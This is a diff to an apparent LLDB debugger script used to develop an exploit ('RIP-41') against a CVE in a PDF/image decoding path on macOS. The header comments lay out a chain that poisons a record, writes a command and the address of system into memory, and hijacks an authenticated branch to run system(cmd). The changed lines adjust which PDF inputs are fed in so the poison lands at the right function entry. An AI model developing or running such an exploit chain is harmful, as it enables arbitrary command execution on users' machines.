@@ -1,7 +1,7 @@
 # RIP-41: OFFSET-FREE GADGET (version-agnostic; built for macOS 26 lane).
 # No +2540, no +1804, no store-site dependency. Chain:
 #   marker2 -> capture g_rec + g_system/g_exit/g_cmd; write cmd; early poison.
-#   decode2 runs naturally; generic fault-skipper keeps it alive on ANY layout.
+#   decode2 = CLEAN pdf (fault-storm of poisoned decode2 never completes naturally).
 #   marker3 -> re-poison record (post-revert window).
 #   data_release_info ENTRY (x0==g_rec) -> WriteMemory rec+0x00=CMD, +0x18=system
 #   DRI+24 -> x8 must be system (natural ldr) -> blraaz -> system(cmd) -> file.
@@ -68,7 +68,7 @@ R = SYS = CMD = None; sysfired = False; result = "incomplete"
 b_m2 = t.BreakpointCreateByName("marker2")
 b_m3 = t.BreakpointCreateByName("marker3")
 b_dri = t.BreakpointCreateByName("data_release_info")
-p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_d31472.pdf", "k2_s1000.pdf"], None, CVE)
+p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_s1000.pdf", "k2_s1000.pdf"], None, CVE)  # RIP-41b: clean decode2 (no fault-storm); poison lands at DRI-entry
 if p and p.IsValid():
     skips = 0; lastfaults = {}
     for i in range(20000):
